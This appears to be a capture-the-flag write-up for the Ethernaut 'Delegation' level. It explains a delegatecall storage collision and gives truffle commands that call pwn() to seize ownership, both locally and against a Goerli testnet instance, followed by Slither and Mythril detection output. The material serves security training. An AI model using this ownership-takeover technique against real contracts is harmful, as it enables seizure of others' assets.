# Delegation

[Delegation](https://ethernaut.openzeppelin.com/level/0xF781b45d11A37c51aabBa1197B61e6397aDf1f78)

_Claim ownership of the instance given._

`Delegation` is forwarding calls to `Delegate`. However the two are occupying the same storage slots. Hence on calling `Delegate::pwn()`, we overwrite
the owner of `Delegation`. 


<BR />

## Test
```BASH
> truffle develop
```

```JS
migrate
d1 = await Delegate.deployed()
d2 = await Delegation.deployed()
d3 = await Delegate.at(d2.address)

sender = accounts[5]
await d3.pwn({from: sender})
await d2.owner()
```

<BR />

## Live Attack
```BASH
truffle console --network goerli
```

```JS
d2 = await Delegation.at('0x115b0b955937EC808b9C4030868F15225A910B3A')
d3 = await Delegate.at('0x115b0b955937EC808b9C4030868F15225A910B3A')

// Make sure to get 0xCbB9660eA60B895443ef5001B968b6Ae4c0AaA18
sender = accounts[5]
await d3.pwn({from: sender})
await d2.owner()
```

<BR />


## Vulnerability Testing Tools


<BR />

### Slither

__Detects the use of delegatecall__

```BASH
slither .  --truffle-ignore-compile  --exclude-informational  --exclude-optimization  --print variable-order
```

```
Delegate:
+----------------+---------+------+--------+
|      Name      |   Type  | Slot | Offset |
+----------------+---------+------+--------+
| Delegate.owner | address |  0   |   0    |
+----------------+---------+------+--------+

Delegation:
+---------------------+----------+------+--------+
|         Name        |   Type   | Slot | Offset |
+---------------------+----------+------+--------+
|   Delegation.owner  | address  |  0   |   0    |
| Delegation.delegate | Delegate |  1   |   0    |
+---------------------+----------+------+--------+

. analyzed (2 contracts)
```

```BASH
slither .  --truffle-ignore-compile  --exclude-informational  --exclude-optimization 
```

```
Delegation.fallback() (Delegation.sol#16-21) uses delegatecall to a input-controlled function id
        - (result) = address(delegate).delegatecall(msg.data) (Delegation.sol#17)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#controlled-delegatecall

Delegate.constructor(address)._owner (Delegate.sol#8) lacks a zero-check on :
                - owner = _owner (Delegate.sol#9)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#missing-zero-address-validation
. analyzed (2 contracts with 57 detectors), 2 result(s) found
```

<BR />

### Mythril

__Detects the use of delegatecall__

```BASH
docker run --rm `
        -v /c/temp/QuickTest/blockchain-ctf/ethernaut/03_delegation:/share `
        mythril/myth `
        analyze /share/contracts/. `
        --solv 0.8.0
```

```
==== Delegatecall to user-supplied address ====
SWC ID: 112
Severity: High
Contract: Delegation
Function name: fallback
PC address: 136
Estimated Gas Usage: 2093 - 39386
The contract delegates execution to another contract with a user-supplied address.
The smart contract delegates execution to a user-supplied address.This could allow an attacker to execute arbitrary code in the context of this contract account and manipulate the state of the contract account or execute actions on its behalf.
--------------------
In file: /share/contracts/delegation.sol:17

address(delegate).delegatecall(msg.data)

--------------------
Initial State:

Account: [CREATOR], balance: 0x0, nonce:0, storage:{}
Account: [ATTACKER], balance: 0x0, nonce:0, storage:{}

Transaction Sequence:

Caller: [CREATOR], calldata: 000000000000000000000000deadbeefdeadbeefdeadbeefdeadbeefdeadbeef0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, decoded_data: , value: 0x0
Caller: [ATTACKER], function: blockHashAddendsInexpansible(uint256), txdata: 0x00000000, value: 0x0

==== Unchecked return value from external call. ====
SWC ID: 104
Severity: Medium
Contract: Delegation
Function name: fallback
PC address: 136
Estimated Gas Usage: 2093 - 39386
The return value of a message call is not checked.
External calls return a boolean value. If the callee halts with an exception, 'false' is returned and execution continues in the caller. The caller should check whether an exception happened and react accordingly to avoid unexpected behavior. For example it is often desirable to wrap external calls in require() so the transaction is reverted if the call fails.
--------------------
In file: /share/contracts/delegation.sol:17

address(delegate).delegatecall(msg.data)

--------------------
Initial State:

Account: [CREATOR], balance: 0x0, nonce:0, storage:{}
Account: [ATTACKER], balance: 0x0, nonce:0, storage:{}

Transaction Sequence:

Caller: [CREATOR], calldata: 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, decoded_data: , value: 0x0
Caller: [SOMEGUY], function: blockHashAddendsInexpansible(uint256), txdata: 0x00000000, value: 0x0
```

<BR />

